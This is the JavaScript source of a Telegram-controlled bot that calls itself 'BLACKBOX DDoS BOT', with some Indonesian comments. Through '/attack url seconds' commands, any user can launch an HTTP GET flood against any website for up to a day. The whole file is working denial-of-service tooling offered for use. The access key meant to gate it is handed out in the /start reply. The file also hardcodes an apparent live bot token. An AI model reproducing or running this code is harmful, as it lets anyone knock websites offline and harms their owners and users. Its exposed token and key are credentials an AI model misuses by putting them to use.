import fetch from 'node-fetch'

// ===== CONFIG =====
const BOT_TOKEN = '8202346696:AAG2I28nxL0qGatWEre6IJL_y63yXXeuJMc'
const OWNER_ID = 6629230649
const ACCESS_KEY = '123RJhTtApALhaT'

console.log('🔧 BLACKBOX WEBHOOK LOADED')

// ===== STATE =====
const users = new Set([OWNER_ID])
const attacks = new Map()

// ===== HELPER =====
async function sendMessage(chatId, text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'HTML'
      })
    })
  } catch (e) {
    console.log('Send error:', e.message)
  }
}

// ===== ATTACK FUNCTION =====
function startAttack(target, seconds, chatId, attackId) {
  console.log(`🚀 Starting attack ${attackId} on ${target} for ${seconds}s`)
  
  const startTime = Date.now()
  const endTime = startTime + (seconds * 1000)
  let requestCount = 0
  
  const worker = setInterval(() => {
    if (Date.now() > endTime) {
      clearInterval(worker)
      attacks.delete(attackId)
      
      const duration = (Date.now() - startTime) / 1000
      sendMessage(chatId,
        `✅ ATTACK FINISHED\n\n` +
        `ID: <code>${attackId}</code>\n` +
        `Target: ${target}\n` +
        `Duration: ${duration.toFixed(1)}s\n` +
        `Requests: ${requestCount}`
      )
      return
    }
    
    // Simple request
    try {
      fetch(target, { signal: AbortSignal.timeout(2000) })
        .then(() => requestCount++)
        .catch(() => {})
    } catch (e) {}
  }, 100)
  
  attacks.set(attackId, { worker, chatId, target, startTime })
}

// ===== COMMAND HANDLER =====
async function handleMessage(message) {
  const chatId = message.chat.id
  const text = message.text || ''
  const userId = message.from.id
  
  console.log(`📨 ${userId}: ${text}`)
  
  // Save user
  if (!users.has(userId)) {
    users.add(userId)
  }
  
  // ===== COMMANDS =====
  if (text === '/start') {
    const isOwner = userId === OWNER_ID
    
    let response = `⚡ <b>BLACKBOX DDoS BOT</b>\n\n`
    response += `User ID: <code>${userId}</code>\n`
    response += `Status: ${isOwner ? '👑 OWNER' : '✅ USER'}\n\n`
    
    response += `<b>COMMANDS:</b>\n`
    response += `• /ping - Test response\n`
    response += `• /attack url seconds - Start attack\n`
    response += `• /stop id - Stop attack\n`
    response += `• /methods - Show methods\n`
    
    if (!isOwner) {
      response += `\n<b>ACCESS KEY:</b>\n<code>${ACCESS_KEY}</code>\n`
      response += `Use /key [key] to unlock`
    }
    
    await sendMessage(chatId, response)
  }
  
  else if (text === '/ping') {
    const start = Date.now()
    await sendMessage(chatId, '🏓 PONG')
    const latency = Date.now() - start
    await sendMessage(chatId, `⏱️ Response: <code>${latency}ms</code>`)
  }
  
  else if (text.startsWith('/key')) {
    const key = text.split(' ')[1]
    
    if (userId === OWNER_ID) {
      await sendMessage(chatId, '👑 Owner tidak perlu key')
      return
    }
    
    if (key === ACCESS_KEY) {
      users.add(userId)
      await sendMessage(chatId,
        `✅ <b>ACCESS GRANTED!</b>\n\n` +
        `User ID: <code>${userId}</code>\n` +
        `Status: AUTHORIZED\n\n` +
        `Now you can use /attack command`
      )
    } else {
      await sendMessage(chatId, '❌ Invalid key')
    }
  }
  
  else if (text.startsWith('/attack')) {
    if (!users.has(userId) && userId !== OWNER_ID) {
      await sendMessage(chatId, '❌ Not authorized\nUse /key first')
      return
    }
    
    const parts = text.split(' ')
    if (parts.length < 3) {
      await sendMessage(chatId, '❌ Format: /attack [url] [seconds]\nExample: /attack https://site.com 60')
      return
    }
    
    const url = parts[1]
    const seconds = parseInt(parts[2])
    
    if (!url.startsWith('http')) {
      await sendMessage(chatId, '❌ Invalid URL\nUse http:// or https://')
      return
    }
    
    if (seconds < 1 || seconds > 86400) {
      await sendMessage(chatId, '❌ Duration: 1-86400 seconds')
      return
    }
    
    const attackId = Math.random().toString(36).substring(2, 8).toUpperCase()
    
    await sendMessage(chatId,
      `🚀 <b>ATTACK LAUNCHED</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Target: ${url}\n` +
      `Duration: ${seconds}s\n` +
      `User: <code>${userId}</code>\n\n` +
      `Stop: <code>/stop ${attackId}</code>`
    )
    
    startAttack(url, seconds, chatId, attackId)
  }
  
  else if (text.startsWith('/stop')) {
    const attackId = text.split(' ')[1]?.toUpperCase()
    
    if (!attackId) {
      await sendMessage(chatId, '❌ Format: /stop [attack_id]')
      return
    }
    
    const attack = attacks.get(attackId)
    if (!attack) {
      await sendMessage(chatId, '❌ Attack not found')
      return
    }
    
    if (attack.chatId !== chatId && userId !== OWNER_ID) {
      await sendMessage(chatId, '❌ You can only stop your own attacks')
      return
    }
    
    clearInterval(attack.worker)
    attacks.delete(attackId)
    
    const duration = (Date.now() - attack.startTime) / 1000
    await sendMessage(chatId,
      `🛑 <b>ATTACK STOPPED</b>\n\n` +
      `ID: <code>${attackId}</code>\n` +
      `Duration: ${duration.toFixed(1)}s\n` +
      `Target: ${attack.target}`
    )
  }
  
  else if (text === '/methods') {
    await sendMessage(chatId,
      `⚡ <b>ATTACK METHODS</b>\n\n` +
      `• <b>HTTP Flood</b> - GET requests\n` +
      `• Auto-stop after duration\n` +
      `• No limit on duration\n` +
      `• Real-time progress\n\n` +
      `<b>Example:</b>\n` +
      `<code>/attack https://target.com 60</code>\n` +
      `<code>/attack https://target.com 300</code>`
    )
  }
  
  else if (text === '/users' && userId === OWNER_ID) {
    const userList = Array.from(users).map(id => `• ${id}`).join('\n')
    await sendMessage(chatId, `👥 <b>USERS (${users.size})</b>\n\n${userList}`)
  }
  
  else {
    // Unknown command
    await sendMessage(chatId, '❌ Unknown command\nUse /start for menu')
  }
}

// ===== MAIN HANDLER =====
export default async function handler(req, res) {
  console.log(`\n=== REQUEST ${req.method} ===`)
  
  // GET - Status page
  if (req.method === 'GET') {
    return res.status(200).json({
      status: 'BLACKBOX ACTIVE',
      owner: OWNER_ID,
      users: users.size,
      attacks: attacks.size,
      uptime: process.uptime(),
      webhook: 'ENABLED'
    })
  }
  
  // POST - Telegram webhook
  if (req.method === 'POST') {
    try {
      const update = req.body
      console.log('Update:', JSON.stringify(update).substring(0, 300))
      
      // Telegram mengirim update dengan field "message"
      if (update.message) {
        await handleMessage(update.message)
      }
      // Atau bisa juga "edited_message"
      else if (update.edited_message) {
        await handleMessage(update.edited_message)
      }
      // Atau callback query (untuk inline buttons)
      else if (update.callback_query) {
        console.log('Callback query:', update.callback_query)
      }
      else {
        console.log('Unknown update type:', Object.keys(update))
      }
      
      return res.status(200).json({ ok: true })
      
    } catch (error) {
      console.log('❌ Handler error:', error)
      console.log('Stack:', error.stack)
      return res.status(200).json({ ok: true })
    }
  }
  
  return res.status(405).json({ error: 'Method not allowed' })
}

// ===== INIT =====
console.log(`✅ Bot Owner: ${OWNER_ID}`)
console.log(`✅ Access Key: ${ACCESS_KEY}`)
console.log(`✅ Webhook ready`)
